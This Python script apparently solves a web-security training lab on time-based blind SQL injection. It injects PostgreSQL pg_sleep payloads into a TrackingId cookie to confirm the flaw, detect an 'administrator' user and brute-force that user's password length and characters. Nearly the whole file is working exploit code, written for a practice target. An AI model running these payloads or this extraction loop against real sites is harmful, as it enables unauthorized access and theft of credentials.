# SQL injection 41 of 51
# Lab: Blind SQL injection with time delays and information retrieval

import asyncio
from pprint import pprint
from common.base import run_payloads

RAW_REQUEST = """
GET /filter?category=Lifestyle HTTP/2
Host: 0aff00c303048255848b3e7f00b10021.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:154.0) Gecko/20100101 Firefox/154.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br, zstd
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: https://0aff00c303048255848b3e7f00b10021.web-security-academy.net/
Cookie: session=SndH2uCRToo3iXuAWXIbCBRBRPDmU85Q; TrackingId=1HTwb7fhSZEHbgby@@@PAYLOAD@@@
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
TE: trailers
""".strip()

async def one_call(raw_req):
    """A simple call. Returns the response"""

    result = await run_payloads(raw_req, [{}], lambda x: True)
    return result

async def print_net_result(raw_req, print_error_body=False):
    result = await one_call(raw_req)
    if result['status_code'] == 200:
        secs = result['total_seconds']
        print(f" CALL OK, {secs:.2f} secs")
        return True, secs
    else:
        print(" CALL FAILED")
        if print_error_body:
            pprint(result)
        return False, result['total_seconds']

async def main():

    raw_req_0 = RAW_REQUEST.replace("@@@PAYLOAD@@@", "")
    print('PLAIN CALL:', end='')
    await print_net_result(raw_req_0)

    # Response takes some time (10s + natural execution time)
    raw_req_2 = RAW_REQUEST.replace("@@@PAYLOAD@@@", "'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--")
    print('WITH DELAY:', end='')
    await print_net_result(raw_req_2, False)

    # Response takes no extra time
    raw_req_3 = RAW_REQUEST.replace("@@@PAYLOAD@@@", "'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--")
    print('WITHOUT DELAY:', end='')
    await print_net_result(raw_req_3, False)

    # Response takes extra time if administrator user exists
    raw_req_4 = RAW_REQUEST.replace("@@@PAYLOAD@@@", "'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--")
    print('Check administrator user existence:', end='')
    await print_net_result(raw_req_4, False)

    # We could use "greather than" instead of "equals" and use binary search for the length, but I kept it simple!
    pwd_len = None
    for i in range(1, 40):
        payload = """'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)=@@@LEN@@@)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--""".replace("@@@LEN@@@", str(i))
        raw_req_5 = RAW_REQUEST.replace("@@@PAYLOAD@@@", payload)
        print(f'administrator password length {i}:', end='')
        (ok, secs) = await print_net_result(raw_req_5)
        if ok and secs > 8:
            pwd_len = i
            break

    import string
    pwd = ''
    charset = string.ascii_lowercase + string.ascii_uppercase + string.digits
    for i in range(1, pwd_len+1):
        for c in charset:
            payload = f"""'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{i},1)='{c}')+THEN+pg_sleep(8)+ELSE+pg_sleep(0)+END+FROM+users--"""
            raw_req_8 = RAW_REQUEST.replace("@@@PAYLOAD@@@", payload)
            print(f'administrator password {c} in position {i+1}:', end='')
            (ok, secs) = await print_net_result(raw_req_8)
            if ok and secs > 7:
                pwd += c
                print(f'Password so far: {pwd}')
                break
    

if __name__ == "__main__":
    asyncio.run(main())